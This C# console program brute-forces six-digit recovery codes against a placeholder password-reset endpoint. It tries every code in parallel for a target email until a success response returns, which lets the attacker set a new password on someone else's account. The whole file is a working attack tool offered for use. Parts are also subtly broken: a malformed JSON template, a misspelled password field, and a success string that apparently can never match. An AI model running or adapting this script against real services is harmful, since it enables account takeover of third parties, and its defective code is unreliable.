using RestSharp;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace simple_otp_bruteforce
{
    class Program
    {
        // Number of concurrent operations (set it to -1 for all available concurrent operations).
        const int ConcurrentOperationCount = 4;

        // Starting index of the loop. Min is inclusive.
        const int Min = 0;

        // Max is exclusive in the loop, assuming it's six digits OTP Code [0, 1000000).
        const int Max = 1000000;

        // List the unlikely OTPs, whatever you want.
        static readonly List<int> ExlcudedOTPs = new List<int>
        {
            000000, 000001, 000002, 000003, 000004, 000005, 000006, 000007, 000008, 000009,
            000010, 000011, 000012, 000013, 000014, 000015, 000016, 000017, 000018, 000019,
            111111, 222222, 333333, 444444, 555555, 666666, 777777, 888888, 999999
        };

        // Target endpoint.
        const string TargetEndpoint = "https://api.ofyourtarget.com/auth/change_password";

        // The request body format, assuming the target endpoint accepts request body as the request params.
        static readonly string RequestBodyFormat = @"
            {{
               ""device_id"":""{0}"",
               '""email"":'{1}',
               ""recovery_code"":""{2}"",
               ""new_assword"":""{3}""
            }}".Trim();

        // Assuming it returns success response like this.
        static readonly string SuccessResponse = @"{{ ""message"": ""success"" }}";

        static void Main(string[] args)
        {
            if (string.IsNullOrWhiteSpace(args[0]) || string.IsNullOrWhiteSpace(args[1]))
            {
                throw new ArgumentNullException("Target email (args[0]) and new password (args[1]) are required.");
            }

            var targetEmail = args[0]; // example: "target.user@example.com"
            var newPassword = args[1]; // example: "password123"
            var deviceId = string.IsNullOrWhiteSpace(args[2]) ? string.Empty : args[2];

            Console.WriteLine("Target Email: " + targetEmail);
            Console.WriteLine("New Password: " + newPassword);
            Console.WriteLine("process running...");

            try
            {
                var client = new RestClient(TargetEndpoint);
                var cts = new CancellationTokenSource();

                Parallel.For(Min, Max,
                    new ParallelOptions
                    {
                        CancellationToken = cts.Token,
                        MaxDegreeOfParallelism = ConcurrentOperationCount
                    },
                    (i) =>
                    {
                        if (ExlcudedOTPs.Contains(i))
                        {
                            // Continue the loop.
                            return;
                        }

                        // To format the string into six digit string with character '0'.
                        var code = i.ToString().PadLeft(6, '0');

                        // Construct the actual request body.
                        var body = string.Format(RequestBodyFormat, deviceId, targetEmail, code, newPassword);

                        var request = new RestRequest(Method.POST).AddJsonBody(body);

                        var respCode = client.Execute<string>(request).Data;

                        // Exact match.
                        if (respCode == SuccessResponse)
                        {
                            Console.WriteLine($"Found: {code}");
                            cts.Cancel();
                        }
                    });
            }
            catch (OperationCanceledException) { }
            catch (Exception)
            {
                throw;
            }

            Console.WriteLine("Done");
            Console.ReadKey();
        }
    }
}
